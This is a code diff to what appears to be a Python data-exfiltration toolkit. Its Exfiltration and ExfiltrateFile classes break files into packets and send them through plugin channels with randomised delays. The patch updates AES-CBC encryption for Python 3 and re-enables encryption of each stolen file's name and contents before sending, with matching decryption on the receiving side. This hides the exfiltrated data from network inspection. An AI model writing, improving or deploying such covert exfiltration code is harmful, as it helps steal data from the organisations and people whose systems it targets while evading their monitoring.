@@ -16,6 +16,7 @@ from random import randint
 from os import listdir
 from os.path import isfile, join
 from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
 from zlib import compress, decompress
 from plugins import dukpt
 
@@ -70,9 +71,9 @@ def info(message):
 
 
 # http://stackoverflow.com/questions/12524994/encrypt-decrypt-using-pycrypto-aes-256
-def aes_encrypt(message, key=KEY):
+def aes_encrypt(message: bytes, key: str = KEY) -> bytes:
     try:
-        ksn = ""
+        ksn = b""
         # If using DUKPT, generate a new key
         if dukpt_client:
             info = dukpt_client.gen_key()
@@ -85,17 +86,19 @@ def aes_encrypt(message, key=KEY):
         aes = AES.new(hashlib.sha256(key.encode()).digest(), AES.MODE_CBC, iv)
 
         # Add PKCS5 padding
-        pad = lambda s: s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)
+        # pad = lambda s: s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)
+        # Use crypto.Util.Padding.pad, default is PKCS7
 
         # Return data size, iv and encrypted message
-        return iv + ksn + aes.encrypt(pad(message))
+        return iv + ksn + aes.encrypt(pad(message, AES.block_size))
     except Exception as err:
         print(Exception, err)
         print(traceback.format_exc())
         print(sys.exc_info()[2])
-        return None
+        raise err
+        # return None
 
-def aes_decrypt(message, key=KEY):
+def aes_decrypt(message: bytes, key: str = KEY) -> bytes:
     try:
         # Retrieve CBC IV
         iv = message[:AES.block_size]
@@ -111,11 +114,13 @@ def aes_decrypt(message, key=KEY):
         message = aes.decrypt(message)
 
         # Remove PKCS5 padding
-        unpad = lambda s: s[:-ord(s[len(s) - 1:])]
+        # unpad = lambda s: s[:-ord(s[len(s) - 1:])]
+        # Use crypto.Util.Padding.unpad, default is PKCS7
 
-        return unpad(message)
-    except:
-        return None
+        return unpad(message, AES.block_size)
+    except Exception as err:
+        # return None
+        raise err
 
 # Do a md5sum of the buffer
 def md5(buffer):
@@ -131,8 +136,8 @@ function_mapping = {
     'warning': warning,
     'ok': ok,
     'info': info,
-    'aes_encrypt' : aes_encrypt,
-    'aes_decrypt': aes_decrypt
+    # 'aes_encrypt' : aes_encrypt,
+    # 'aes_decrypt': aes_decrypt
 }
 
 
@@ -220,7 +225,7 @@ class Exfiltration(object):
         if jobid not in files:
             files[jobid] = {}
             files[jobid]['checksum'] = message[3].lower()
-            files[jobid]['filename'] = bytes.fromhex(message[1]).decode().lower()
+            files[jobid]['filename'] = aes_decrypt(bytes.fromhex(message[1]), self.KEY).decode().lower()
             files[jobid]['data'] = []
             files[jobid]['packets_order'] = []
             files[jobid]['packets_len'] = -1
@@ -241,7 +246,7 @@ class Exfiltration(object):
                 [list(x) for x in zip(*sorted(zip(files[jobid]['packets_order'], files[jobid]['data'])))]
         # content = ''.join(str(v) for v in files[jobid]['data']).decode('hex')
         content = bytes.fromhex(''.join(str(v) for v in files[jobid]['data']))
-        #content = aes_decrypt(content, self.KEY)
+        content = aes_decrypt(content, self.KEY)
         if COMPRESSION:
             content = decompress(content)
         try:
@@ -336,7 +341,7 @@ class ExfiltrateFile(threading.Thread):
 
         warning("[!] Registering packet for the file")
         data = "%s|!|%s|!|REGISTER|!|%s" % (
-            self.jobid, os.path.basename(self.file_to_send).encode().hex(), self.checksum)
+            self.jobid, aes_encrypt(os.path.basename(self.file_to_send).encode(), self.exfiltrate.KEY).hex(), self.checksum)
         plugin_send_function(data)
 
         time_to_sleep = randint(1, MAX_TIME_SLEEP)
@@ -348,8 +353,10 @@ class ExfiltrateFile(threading.Thread):
         data = buffer.read()
         if COMPRESSION:
             data = compress(data)
-        # f.write(aes_encrypt(data, self.exfiltrate.KEY))
-        f.write(data)
+        cipher = aes_encrypt(data, self.exfiltrate.KEY)
+        f.write(cipher)
+        # f.write(data)
+
         f.seek(0)
 
         packet_index = 0
